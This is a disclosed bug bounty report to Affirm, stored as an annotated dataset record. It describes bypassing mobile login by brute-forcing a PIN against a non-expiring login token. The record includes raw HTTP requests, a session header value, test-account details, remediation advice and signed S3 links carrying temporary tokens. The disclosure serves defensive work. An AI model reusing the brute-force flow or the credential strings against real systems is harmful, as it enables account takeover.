{
    "reported_to": "Affirm",
    "reported_by": "yogesh_ojha ",
    "title": "Absence of Token expiry leads to Unauthorized login Access",
    "content": "\nSummary\nWhile doing the testing for the mobile app, I observed out that it is possible to bypass the authentication and gain unauthorized access to the user's account bu brute-forcing the PIN due to lack of login token expiry.\nThe way affirm mobile login works is that,\nUser inputs the phone number\nIt then makes a call to an API endpoint /api/v3/login/phone/\nCode 282 Bytes\n1POST /api/v3/login/phone/ HTTP/1.1\n2Content-Type: application/json; charset=UTF-8\n3Content-Length: 40\n4Host: hackerone.affirm-odin.com\n5Connection: close\n6Accept-Encoding: gzip, deflate\n7User-Agent: okhttp/3.13.1\n8Affirm-User-Agent: Affirm-Android\n9\n10{\"channel\":\"sms\",\"address\":\"7022170000\"}\nThis endpoint /api/v3/login/phone/ in turn generates a token and sends in the response.\nThe response looks something similar to this\nCode 411 Bytes\n1HTTP/1.1 200 OK\n2Date: Tue, 31 Dec 2019 11:53:27 GMT\n3Content-Type: application/json\n4Connection: close\n5Server: openresty\n6Vary: Accept-Encoding\n7Affirm-Device: XXX=\n8Affirm-Client: XXXX-\n9cache-control: private, no-cache, no-store, must-revalidate\n10X-Affirm-Request-Id: a3bcdedb-0e18-4760-c796-1cd60158f86c\n11Strict-Transport-Security: max-age=86400\n12Content-Length: 299\n13\n14{\"response_url\": \"/api/v3/login/phone/SOMETOKEN\"}\nAnother call to the api is made to the URL obtained from the above response_url This API request looks like this\nCode 322 Bytes\n1POST /api/v3/login/phone/SOMETOKEN HTTP/1.1\n2Content-Type: application/json; charset=UTF-8\n3Content-Length: 19\n4Host: hackerone.affirm-odin.com\n5Connection: close\n6Accept-Encoding: gzip, deflate\n7Affirm-User-Agent: Affirm-Android\n8Affirm-App-Version: 3.62.3\n9Affirm-App-Version-Code: 312\n10Affirm-OS-Version: 22\n11\n12{\"response\":\"0000\"}\n<image_0>\nThe response will be\nCode 661 Bytes\n1HTTP/1.1 200 OK\n2Date: Tue, 31 Dec 2019 12:30:58 GMT\n3Content-Type: application/json\n4Connection: close\n5Server: openresty\n6Vary: Accept-Encoding\n7Affirm-Device: eyJkZXZpY2VfaWQiOiAiZDk3NTcyNTQtYmZkNS00NGFiLWE1ZjQtMTk3YzI2NzhjMTQyIn0=\n8Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk\n9cache-control: private, no-cache, no-store, must-revalidate\n10X-Affirm-Request-Id: dc1a2835-e8bc-4f0e-cf08-05c50c942eca\n11Strict-Transport-Security: max-age=86400\n12Content-Length: 109\n13\n14{\"status\": \"authenticated\", \"token\": null, \"user_id\": \"1479-5770-XGGL\", \"expiration\": \"3019-12-31T17:17:38Z\"}\nThis response contains Affirm-Client which is like a session ID, later used to make a request.\nTo verify if this is the actual session ID or not, this can be done by making a request to the api\nCode 428 Bytes\n1GET /api/v2/users/1479-5770-XGGL HTTP/1.1\n2Host: hackerone.affirm-odin.com\n3Connection: close\n4Accept-Encoding: gzip, deflate\n5User-Agent: okhttp/3.13.1\n6Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk\n7Affirm-Platform: android\n8Affirm-User-Agent: Affirm-Android\n9Affirm-App-Version: 3.62.3\n10Affirm-App-Version-Code: 312\n11Affirm-OS-Version: 22\nThe user ID can also be obtained from the above response.\nIf the Affirm-Client is valid, then you would get the user details on this endpoint which would confirm this vulnerability.\nCode 834 Bytes\n1{\"phone_number\": {\"phone_number\": \"+1-702-217-0000\", \"user_id\": \"1479-5770-XGGL\", \"id\": \"CNAIG0U1BMPHN5BK\"}, \"status\": \"ACTIVE\", \"name\": {\"last\": \"NEPAK\", \"full\": \"TESTING NEPAK\", \"user_id\": \"1479-5770-XGGL\", \"id\": \"4ZBC33TYEY12SOWP\", \"first\": \"TESTING\"}, \"is_personalized_services_active\": true, \"created\": \"2019-12-31T10:48:00Z\", \"dob\": \"1980-06-23\", \"id\": \"1479-5770-XGGL\", \"address_confirmation_status\": \"not confirmed\", \"address\": {\"city\": \"San Francisco\", \"user_id\": \"1479-5770-XGGL\", \"is_po_box\": false, \"street1\": \"325 Pacific Ave\", \"region1_code\": \"CA\", \"is_military_address\": false, \"postal_code\": \"94111\", \"country_code\": \"USA\", \"id\": \"G2YM6ESBLH36ETLZ\"}, \"user_consented_to_lto\": null, \"email\": {\"verified\": false, \"user_id\": \"1479-5770-XGGL\", \"email\": \"who_has_no_name+0000@wearehackerone.com\", \"id\": \"B9SUH5XOB1559Q8J\"}}\n<image_1>\nRemediation\nRate limiting could be one of the fundamental solutions by limiting the number of the wrong OTP a user can submit.\nThe fundamental problem here is not that OTP is possible for Bruteforce, but the lack of token expiry generated for login purpose.\nLuckily, there is a better way for this. When the user enters the number, and a password login URL/login is generated on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/, the URL could be set invalid after a few OTP limits.\nOnce this is set to expiry, then to make another consecutive request to the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN would be automatically invalid. This should be done without even checking OTP to prevent brute-forcing. The login token generation on the endpoint https://hackerone.affirm-odin.com/api/v3/login/phone/ should be limited.\nImpact\nUnauthorized account access, Account takeover\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": 1000,
    "weaknesses": [
        "Improper Authentication - Generic"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GawqacC3qzn1LFnHJxLQdqNJ?response-content-disposition=attachment%3B%20filename%3D%221.PNG%22%3B%20filename%2A%3DUTF-8%27%271.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7COGOGM5%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T220152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDMHnXgFt9FFxq7D8TaF4LnPpUINexAzviYv2qAsWf3zAIgez9qdNbGB0TQs0vGiUkjbYCbn5%2Fsulq5IQvVDgvQcWwqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDNUCkY4Gr4IFartaCSqPBV4f6M334IQ%2BMX8RMynf0fEyLS2LMZek7KE1LLqdyqxKJlr6wbXZJBTgailVE84WcSxY1EIv4%2FxlvknfkA4u9PNWpUtd%2FMRfF3jiEbDjnKjptoRSD2mMMpNz7QhBk72YFztxPJscefxTUqeQgs58GQG4mWyjk1wgcioWcJ%2FGGZbHslsNwZbrhITZddbpD6Nzv5rZ8rurczG36C8N%2BfwUQ0vw8rKUMDMtekJC2Xi2TmVELZiu7TM3h4cvB6tyxsJvWQ%2F5FtGocRgQO2ESojdXQeY1t00KNZayepVlQstAe2Wv%2FPRdOCm%2FRyK8i92nMsXVvIywgHZ%2FUc%2FXq4wg7OS9u4AzHMACqB4pBXApVBesnFJCOUHrL5PMB0LDjK18bfVfhNJvqlc76AoD2n82U79s60CBbMUqSDJKW4Lsn2wlVIm2cMlgZCH8vlOzX%2FWALpQq1NhBGmi3%2FivPdUlEeHmXHo%2B7lUS4VtXanq8FG8wmYTcL90inplp27nsw9TxZcqRjJI89eUD9NA4x9K4zcWNjbECmL0Gc7NlbjHA2aj1Qnv2iRDetwhisVZaPe5qvY61pUM5404lkThi%2BVb%2BzmfyuQD0CVuWZwAbyGW%2FT7KZuELwsb3XYD%2Fl%2BrGPEztJAB4%2FaAkMKQCxaBYGmem8xPJZIXheiRrWDmN5mLehm58GBzz8OzMg7iNqnE3sJVZZbIOwxwAMa2nM4%2FKvH%2FQHBepkTGAA2%2F%2BOcxp1RiRXb5LuyU0DTANb73L9ytO7cqbvoqWgmivJW4O5wn2sYRVFCU7uc%2Bax1FpSwG3xNku5Q9tISaWhlVTxgGo1Kviog2BjXbmrgX6YP7Dzg%2BgpztLlEfvWPylnx4BOGRgx7ZYJqecTFIiAw3ZmMvwY6sQGGRNuhbwJmlPELgyMLfi1cYrpE8QEQ%2BFG8iFK13BOaBe8430LDUEheBKL7%2FTR5zJ94q1D8PYMwFRmxO0OHVz2yIlHuolWC%2Fy3wekxAYs5MpPF1VXCOgG7%2FFw4KPhh2AruiJ4YjlEKnic%2FQ3PYQqzB%2F2saQH1LqGC8JlnOPROzPTexgP4%2Ft4RY2wzGxn9Z6h9TGmZ1KsMuUpu7Wdv1C69teen5jn%2F0zoYokvkxL844SJN0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=59519145a80464e1dd9306a4b4d1900bf3cbc35d5641f7ea23b87796fdc2b553",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UJcJT6K56pTjFNbhCMGYF5Td?response-content-disposition=attachment%3B%20filename%3D%222.PNG%22%3B%20filename%2A%3DUTF-8%27%272.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7COGOGM5%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T220152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDMHnXgFt9FFxq7D8TaF4LnPpUINexAzviYv2qAsWf3zAIgez9qdNbGB0TQs0vGiUkjbYCbn5%2Fsulq5IQvVDgvQcWwqsgUIHRADGgwwMTM2MTkyNzQ4NDkiDNUCkY4Gr4IFartaCSqPBV4f6M334IQ%2BMX8RMynf0fEyLS2LMZek7KE1LLqdyqxKJlr6wbXZJBTgailVE84WcSxY1EIv4%2FxlvknfkA4u9PNWpUtd%2FMRfF3jiEbDjnKjptoRSD2mMMpNz7QhBk72YFztxPJscefxTUqeQgs58GQG4mWyjk1wgcioWcJ%2FGGZbHslsNwZbrhITZddbpD6Nzv5rZ8rurczG36C8N%2BfwUQ0vw8rKUMDMtekJC2Xi2TmVELZiu7TM3h4cvB6tyxsJvWQ%2F5FtGocRgQO2ESojdXQeY1t00KNZayepVlQstAe2Wv%2FPRdOCm%2FRyK8i92nMsXVvIywgHZ%2FUc%2FXq4wg7OS9u4AzHMACqB4pBXApVBesnFJCOUHrL5PMB0LDjK18bfVfhNJvqlc76AoD2n82U79s60CBbMUqSDJKW4Lsn2wlVIm2cMlgZCH8vlOzX%2FWALpQq1NhBGmi3%2FivPdUlEeHmXHo%2B7lUS4VtXanq8FG8wmYTcL90inplp27nsw9TxZcqRjJI89eUD9NA4x9K4zcWNjbECmL0Gc7NlbjHA2aj1Qnv2iRDetwhisVZaPe5qvY61pUM5404lkThi%2BVb%2BzmfyuQD0CVuWZwAbyGW%2FT7KZuELwsb3XYD%2Fl%2BrGPEztJAB4%2FaAkMKQCxaBYGmem8xPJZIXheiRrWDmN5mLehm58GBzz8OzMg7iNqnE3sJVZZbIOwxwAMa2nM4%2FKvH%2FQHBepkTGAA2%2F%2BOcxp1RiRXb5LuyU0DTANb73L9ytO7cqbvoqWgmivJW4O5wn2sYRVFCU7uc%2Bax1FpSwG3xNku5Q9tISaWhlVTxgGo1Kviog2BjXbmrgX6YP7Dzg%2BgpztLlEfvWPylnx4BOGRgx7ZYJqecTFIiAw3ZmMvwY6sQGGRNuhbwJmlPELgyMLfi1cYrpE8QEQ%2BFG8iFK13BOaBe8430LDUEheBKL7%2FTR5zJ94q1D8PYMwFRmxO0OHVz2yIlHuolWC%2Fy3wekxAYs5MpPF1VXCOgG7%2FFw4KPhh2AruiJ4YjlEKnic%2FQ3PYQqzB%2F2saQH1LqGC8JlnOPROzPTexgP4%2Ft4RY2wzGxn9Z6h9TGmZ1KsMuUpu7Wdv1C69teen5jn%2F0zoYokvkxL844SJN0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7449dcdeea47619f67f7cf54f6070a21c05283ed89d5afd4f87be5722cb2eae5"
    },
    "disclosed_date": 1606799340,
    "report_url": "https://hackerone.com/reports/766578",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "MOBILE",
    "steps": [
        [
            1,
            "Send a POST request to /api/v3/login/phone/ with a phone number to generate a login token."
        ],
        [
            2,
            "Use the generated token to make a POST request to /api/v3/login/phone/SOMETOKEN with a brute-forced PIN until successful authentication."
        ]
    ],
    "vuln_description": "The vulnerability allows unauthorized access to user accounts by brute-forcing the PIN due to the lack of token expiry. The login token generated does not expire, enabling repeated attempts to guess the PIN without limitation.",
    "reason": "The attack involves understanding the token generation and authentication flow, but the steps to exploit it are straightforward once the token is obtained. The lack of token expiry is a common security oversight, making the discovery less complex.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "idor_detectable": false,
    "authnz_byppass_detectable": true,
    "is_simple_payload": false,
    "injection_metadata": {
        "is_simple_payload": false
    },
    "authnz_metadata": {
        "idor_detectable": false,
        "authnz_byppass_detectable": true
    }
}